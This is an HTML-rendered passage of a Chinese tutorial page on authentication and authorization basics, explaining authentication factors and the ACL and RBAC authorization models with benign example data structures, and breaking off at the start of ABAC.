</li>
        
          <li class="md-nav__item">
  <a href="#加密encryption" class="md-nav__link">
    <span class="md-ellipsis">
      
        加密（Encryption）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#数字签名" class="md-nav__link">
    <span class="md-ellipsis">
      
        数字签名
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#常见攻击方式与防护" class="md-nav__link">
    <span class="md-ellipsis">
      
        常见攻击方式与防护
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="常见攻击方式与防护">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-暴力破解攻击brute-force-attack" class="md-nav__link">
    <span class="md-ellipsis">
      
        1. 暴力破解攻击（Brute Force Attack）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-会话固定攻击session-fixation" class="md-nav__link">
    <span class="md-ellipsis">
      
        2. 会话固定攻击（Session Fixation）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-跨站脚本攻击xss---cross-site-scripting" class="md-nav__link">
    <span class="md-ellipsis">
      
        3. 跨站脚本攻击（XSS - Cross-Site Scripting）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-跨站请求伪造csrf---cross-site-request-forgery" class="md-nav__link">
    <span class="md-ellipsis">
      
        4. 跨站请求伪造（CSRF - Cross-Site Request Forgery）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-sql注入攻击sql-injection" class="md-nav__link">
    <span class="md-ellipsis">
      
        5. SQL注入攻击（SQL Injection）
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#6-中间人攻击man-in-the-middle-attack" class="md-nav__link">
    <span class="md-ellipsis">
      
        6. 中间人攻击（Man-in-the-Middle Attack）
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#安全最佳实践" class="md-nav__link">
    <span class="md-ellipsis">
      
        安全最佳实践
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="安全最佳实践">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-密码安全" class="md-nav__link">
    <span class="md-ellipsis">
      
        1. 密码安全
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-token安全" class="md-nav__link">
    <span class="md-ellipsis">
      
        2. Token安全
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-api安全" class="md-nav__link">
    <span class="md-ellipsis">
      
        3. API安全
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-日志与监控" class="md-nav__link">
    <span class="md-ellipsis">
      
        4. 日志与监控
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-安全配置清单" class="md-nav__link">
    <span class="md-ellipsis">
      
        5. 安全配置清单
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#总结_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        总结
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../02-%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%A0%87%E5%87%86/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    认证协议与标准
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Java认证框架对比
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SpringSecurity核心架构
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SpringSecurity实战配置
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06-SpringSecurity-OAuth2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    SpringSecurity-OAuth2
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    代码示例集
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    高级主题与最佳实践
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
          
          
        
      
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_10" >
        
          
          <label class="md-nav__link" for="__nav_3_10" id="__nav_3_10_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    设计文档
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10">
            <span class="md-nav__icon md-icon"></span>
            
  
    设计文档
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../design/01-%E9%A1%B9%E7%9B%AE%E8%A7%84%E5%88%92/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    项目规划
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../design/02-%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    架构设计
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../design/03-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    数据库设计
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../design/04-API%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    API接口文档
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../design/05-%E9%83%A8%E7%BD%B2%E8%BF%90%E7%BB%B4/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    部署运维
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../devops/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    DevOps与工具
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../cloud-native/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    云原生技术
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../middleware/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    中间件技术
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../go/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    
  
    Go语言系列
  

    
  </span>
  
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              
                



  


  <nav class="md-path" aria-label="导航栏" >
    <ol class="md-path__list">
      
        
  
  
    <li class="md-path__item">
      <a href="../.." class="md-path__link">
        
  <span class="md-ellipsis">
    首页
  </span>

      </a>
    </li>
  

      
      
        
  
  
    
    
      <li class="md-path__item">
        <a href="../" class="md-path__link">
          
  <span class="md-ellipsis">
    认证授权
  </span>

        </a>
      </li>
    
  

      
    </ol>
  </nav>

              
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="认证授权基础知识">认证授权基础知识<a class="headerlink" href="#认证授权基础知识" title="链接到此标题">&para;</a></h1>
<h2 id="目录">目录<a class="headerlink" href="#目录" title="链接到此标题">&para;</a></h2>
<ul>
<li><a href="#核心概念">核心概念</a></li>
<li><a href="#认证与授权的区别">认证与授权的区别</a></li>
<li><a href="#会话管理">会话管理</a></li>
<li><a href="#密码学基础">密码学基础</a></li>
<li><a href="#常见攻击方式与防护">常见攻击方式与防护</a></li>
<li><a href="#安全最佳实践">安全最佳实践</a></li>
</ul>
<hr />
<h2 id="核心概念">核心概念<a class="headerlink" href="#核心概念" title="链接到此标题">&para;</a></h2>
<h3 id="什么是认证authentication">什么是认证（Authentication）？<a class="headerlink" href="#什么是认证authentication" title="链接到此标题">&para;</a></h3>
<p>**认证**是验证用户身份的过程，回答"你是谁？"这个问题。</p>
<p><strong>核心要素：</strong>
- <strong>身份标识（Identity）</strong>：唯一识别用户的信息（如用户名、邮箱、手机号）
- <strong>凭证（Credentials）</strong>：证明身份的信息（如密码、指纹、证书）
- <strong>认证因子（Authentication Factors）</strong>：
  - <strong>知识因子</strong>：你知道的（密码、PIN码、安全问题答案）
  - <strong>持有因子</strong>：你拥有的（手机、令牌、智能卡）
  - <strong>固有因子</strong>：你是的（指纹、人脸、虹膜）</p>
<p><strong>认证强度：</strong>
- <strong>单因素认证（SFA）</strong>：只使用一种因子（如仅密码）
- <strong>双因素认证（2FA）</strong>：使用两种不同类型的因子
- <strong>多因素认证（MFA）</strong>：使用两种或以上因子</p>
<h3 id="什么是授权authorization">什么是授权（Authorization）？<a class="headerlink" href="#什么是授权authorization" title="链接到此标题">&para;</a></h3>
<p>**授权**是确定用户可以访问哪些资源的过程，回答"你能做什么？"这个问题。</p>
<p><strong>核心要素：</strong>
- <strong>主体（Subject）</strong>：请求访问的用户或服务
- <strong>资源（Resource）</strong>：被保护的对象（文件、API、数据）
- <strong>权限（Permission）</strong>：允许的操作（读、写、删除、执行）
- <strong>策略（Policy）</strong>：定义访问规则的集合</p>
<p><strong>授权模型：</strong></p>
<h3 id="1-访问控制列表acl---access-control-list">1. 访问控制列表（ACL - Access Control List）<a class="headerlink" href="#1-访问控制列表acl---access-control-list" title="链接到此标题">&para;</a></h3>
<p><strong>理论基础：</strong></p>
<p>ACL是最直观的访问控制模型，直接将访问权限与资源绑定。每个资源维护一个列表，明确指定哪些主体（用户、组）对该资源拥有哪些权限。</p>
<p><strong>工作原理：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>资源 → ACL条目列表
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>每个ACL条目包含：
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>  - 主体标识（用户/组）
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>  - 权限类型（读/写/执行/删除等）
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>  - 允许/拒绝标志
</span></code></pre></div></p>
<p><strong>数据结构示例：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>// 文件系统ACL示例
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>文件: /document/report.pdf
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>ACL:
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>  - { 主体: &quot;user:张三&quot;,   权限: [&quot;READ&quot;, &quot;WRITE&quot;],        类型: ALLOW }
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>  - { 主体: &quot;user:李四&quot;,   权限: [&quot;READ&quot;],                 类型: ALLOW }
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>  - { 主体: &quot;group:财务&quot;, 权限: [&quot;READ&quot;, &quot;WRITE&quot;, &quot;DELETE&quot;], 类型: ALLOW }
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>  - { 主体: &quot;user:王五&quot;,   权限: [&quot;READ&quot;, &quot;WRITE&quot;],        类型: DENY  }
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>// API资源ACL示例
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>资源: /api/orders/{orderId}
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>ACL:
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>  - { 主体: &quot;user:admin&quot;,     权限: [&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;], 类型: ALLOW }
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>  - { 主体: &quot;user:customer&quot;,  权限: [&quot;GET&quot;],                          类型: ALLOW }
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>  - { 主体: &quot;role:订单管理员&quot;, 权限: [&quot;GET&quot;, &quot;PUT&quot;],                   类型: ALLOW }
</span></code></pre></div></p>
<p><strong>实际场景示例：</strong></p>
<ol>
<li>
<p><strong>Linux文件系统权限</strong>
   <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>-rw-r--r--  1 zhang staff  4096 Oct 26 10:30 file.txt
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>所有者(zhang): 读+写
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>组(staff):     读
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>其他:          读
</span></code></pre></div></p>
</li>
<li>
<p><strong>AWS S3存储桶策略</strong>
   <div class="language-json highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">{</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="nt">&quot;Resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;arn:aws:s3:::mybucket/data/*&quot;</span><span class="p">,</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span><span class="nt">&quot;Principal&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;AWS&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;arn:aws:iam::123456789:user/zhang&quot;</span><span class="p">},</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span><span class="nt">&quot;Action&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;s3:GetObject&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;s3:PutObject&quot;</span><span class="p">],</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">  </span><span class="nt">&quot;Effect&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Allow&quot;</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="p">}</span>
</span></code></pre></div></p>
</li>
</ol>
<p><strong>优点：</strong>
- ✅ 简单直观，易于理解
- ✅ 细粒度控制，精确到每个资源
- ✅ 实现简单，性能高
- ✅ 适合资源数量少的场景</p>
<p><strong>缺点：</strong>
- ❌ 资源数量多时管理复杂
- ❌ 权限变更需要逐个修改资源
- ❌ 难以实现统一的权限策略
- ❌ 权限分散，缺乏全局视图
- ❌ 用户离职需清理所有相关ACL</p>
<p><strong>适用场景：</strong>
- 文件系统、对象存储
- 资源数量有限的小型系统
- 需要资源级精确控制的场景
- 云平台资源权限管理</p>
<hr />
<h3 id="2-基于角色的访问控制rbac---role-based-access-control">2. 基于角色的访问控制（RBAC - Role-Based Access Control）<a class="headerlink" href="#2-基于角色的访问控制rbac---role-based-access-control" title="链接到此标题">&para;</a></h3>
<p><strong>理论基础：</strong></p>
<p>RBAC是目前最广泛使用的授权模型，通过引入"角色"作为用户和权限之间的中介层，实现权限的批量管理和复用。</p>
<p><strong>三层模型：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>用户（User） → 角色（Role） → 权限（Permission） → 资源（Resource）
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>核心关系：
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>- 用户分配角色：一个用户可以有多个角色
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>- 角色拥有权限：一个角色包含多个权限
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>- 权限作用于资源：一个权限定义对特定资源的操作
</span></code></pre></div></p>
<p><strong>数据结构示例：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>// 用户表
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>User:
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>  - id: 1001
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  - username: &quot;张三&quot;
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>  - roles: [2, 3]  // 关联角色ID
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>// 角色表
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>Role:
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>  - id: 2
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>  - name: &quot;编辑者&quot;
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>  - description: &quot;可以创建和编辑文章&quot;
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>  - permissions: [101, 102, 103]
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>  - parent_role: null  // 角色继承
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>// 权限表
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>Permission:
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>  - id: 101
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>  - name: &quot;article:create&quot;
</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>  - description: &quot;创建文章&quot;
</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>  - resource: &quot;article&quot;
</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>  - action: &quot;create&quot;
</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>  - id: 102
</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>  - name: &quot;article:edit&quot;
</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>  - resource: &quot;article&quot;
</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>  - action: &quot;edit&quot;
</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>
</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>  - id: 103
</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>  - name: &quot;article:publish&quot;
</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>  - resource: &quot;article&quot;
</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>  - action: &quot;publish&quot;
</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>
</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>// 关系映射
</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>用户张三的权限路径：
</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>张三 → [编辑者角色] → [article:create, article:edit, article:publish]
</span></code></pre></div></p>
<p><strong>RBAC模型层次：</strong></p>
<ol>
<li><strong>RBAC0（核心RBAC）</strong></li>
<li>基础模型：用户-角色-权限</li>
<li>
<p>支持多对多关系</p>
</li>
<li>
<p><strong>RBAC1（分层RBAC）</strong></p>
</li>
<li>
<p>引入角色继承
   <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>高级编辑 继承自 编辑者
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>高级编辑拥有：编辑者的所有权限 + 额外权限
</span></code></pre></div></p>
</li>
<li>
<p><strong>RBAC2（约束RBAC）</strong></p>
</li>
<li>职责分离约束（SoD）</li>
<li>
<p>互斥角色：一个用户不能同时拥有冲突角色
   <div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>例如：出纳员 和 审计员 互斥
</span></code></pre></div></p>
</li>
<li>
<p><strong>RBAC3（统一RBAC）</strong></p>
</li>
<li>RBAC1 + RBAC2的组合</li>
</ol>
<p><strong>实际场景示例：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>企业内容管理系统：
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>角色定义：
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>- 普通用户：浏览文章、评论
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>- 作者：普通用户权限 + 创建文章、编辑自己的文章
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>- 编辑：作者权限 + 编辑所有文章、审核文章
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>- 管理员：编辑权限 + 删除文章、用户管理、系统配置
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>权限矩阵：
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>           | 浏览 | 创建 | 编辑自己 | 编辑所有 | 删除 | 审核 | 用户管理 |
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>-----------|------|------|----------|----------|------|------|----------|
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>普通用户   |  ✓   |      |          |          |      |      |          |
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>作者       |  ✓   |  ✓   |    ✓     |          |      |      |          |
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>编辑       |  ✓   |  ✓   |    ✓     |    ✓     |      |  ✓   |          |
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>管理员     |  ✓   |  ✓   |    ✓     |    ✓     |  ✓   |  ✓   |    ✓     |
</span></code></pre></div>
<p><strong>优点：</strong>
- ✅ 权限管理集中化，易于维护
- ✅ 符合组织结构，角色对应岗位
- ✅ 批量授权，效率高
- ✅ 易于审计和合规
- ✅ 降低管理成本</p>
<p><strong>缺点：</strong>
- ❌ 角色爆炸问题（组合过多）
- ❌ 灵活性相对较低
- ❌ 难以处理动态权限需求
- ❌ 跨组织协作场景支持不足
- ❌ 需要提前规划角色体系</p>
<p><strong>适用场景：</strong>
- 企业内部管理系统
- 权限结构相对稳定的应用
- 用户角色清晰的组织
- 大多数Web应用和SaaS平台</p>
<hr />
<h3 id="3-基于属性的访问控制abac---attribute-based-access-control">3. 基于属性的访问控制（ABAC - Attribute-Based Access Control）<a class="headerlink" href="#3-基于属性的访问控制abac---attribute-based-access-control" title="链接到此标题">&para;</a></h3>
<p><strong>理论基础：</strong></p>
<p>ABAC通过评估主体、资源、环境的多维属性来动态决定访问权限，是最灵活的授权模型。</p>
<p><strong>核心要素：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>访问决策 = f(主体属性, 资源属性, 环境属性, 操作)
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
